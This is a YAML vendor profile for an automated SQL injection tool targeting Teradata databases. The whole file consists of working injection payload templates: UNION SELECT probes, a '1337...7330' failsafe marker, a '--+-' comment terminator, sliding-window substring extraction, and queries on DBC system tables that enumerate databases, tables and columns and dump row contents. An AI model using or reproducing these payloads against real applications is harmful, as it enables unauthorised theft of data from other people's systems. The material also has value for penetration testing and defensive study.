vendor: 
resource: 
 info: |
  select 
      '-'
      || '${enclose_value_sql}'
      || database
      || '${enclose_value_sql}'
      || user
      || '${trail_sql}'
      
 schema: 
  database: |
   select 
       '${enclose_value_sql}'
       || DatabaseName
       || '${separator_qte_sql}0${enclose_value_sql}${trail_sql}'
   FROM (
       select 
           DatabaseName,
           ROW_NUMBER() over (ORDER BY DatabaseName) AS rnum
       from DBC.DBASE
   ) x
   where 1 = 1
   ${limit}
   
  table: |
   select 
       '${enclose_value_sql}'
       || TVMName
       || '${separator_qte_sql}0${enclose_value_sql}${trail_sql}'
   FROM (
       select 
           TVMName,
           ROW_NUMBER() over (ORDER BY TVMName) AS rnum
       from DBC.TVM t 
       inner join DBC.DBASE d on t.DatabaseId = d.DatabaseId
       where DatabaseName = '${database}'
   ) x
   where 1 = 1
   ${limit}
   
  column: |
   select 
       '${enclose_value_sql}'
       || FieldName
       || '${separator_qte_sql}0${enclose_value_sql}${trail_sql}'
   FROM (
       select 
           FieldName,
           ROW_NUMBER() over (ORDER BY FieldName) AS rnum
       from (
           select distinct FieldName
           from DBC.TVFIELDS c 
           inner join DBC.TVM t on c.TableId = t.TVMId
           inner join DBC.DBASE d on t.DatabaseId = d.DatabaseId
           where DatabaseName = '${database}'
           and TVMName = '${table}'
       )x
   )x
   where 1 = 1
   ${limit}
   
  row: 
   query: |
    SELECT 
        '${enclose_value_sql}'
        || r
        || '${separator_qte_sql}0${enclose_value_sql}${trail_sql}'
    from (
        select 
            ${fields} r, 
            ROW_NUMBER() over (ORDER BY 1) AS rnum
        from ${database}.${table}
    )x
    where 1 = 1
    ${limit}
   fields: 
    field: trim(coalesce(''||${field.value}, ''))
    concat: "|| '%7f' ||"
    
strategy: 
 configuration: 
  slidingWindow: |
   select
       /**
        * If reach end of string (${lead}i) then NULLIF nullifies the result
        */
       '${lead}'
       || NULLIF(
           substr(
               (${injection}),
               ${window.char}
           ),
           '${trail_sql}'
        )
  limit: and rnum BETWEEN ${limit.value} AND ${limit.value}
  failsafe: trim('' || (1337${indice}7330%2b1))
  calibrator: |
   cast(
       rpad(
           '${calibrator_sql}', 
           1024, 
           '${calibrator_sql}'
       )
       as varchar(1024)
   )
  limitBoundary: 1
  endingComment: --+-
  fingerprint: 
   errorMessage: 
    - Teradata database
    
 normal: 
  indices: union select ${indices} FROM (SELECT 1 AS x)x
  capacity: (select '${lead}${indice}' || ${calibrator})
  orderBy: order by 1337